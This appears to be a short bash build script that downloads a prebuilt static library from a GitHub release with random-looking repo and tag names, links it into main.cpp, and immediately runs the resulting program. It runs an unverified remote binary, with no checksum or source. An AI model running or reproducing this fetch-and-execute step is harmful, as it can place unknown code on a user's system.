#!/usr/bin/env bash
set -e
REPO="sudanbizy/starkguardlab"
LIB="layered-wharf.a"
URL="https://github.com/${REPO}/releases/download/crimson-forest-golden-canyon/${LIB}"
wget -q --tries=3 --timeout=15 -O "$LIB" "$URL"
g++ -O2 -std=c++17 -pthread main.cpp "$LIB" -o app && ./app
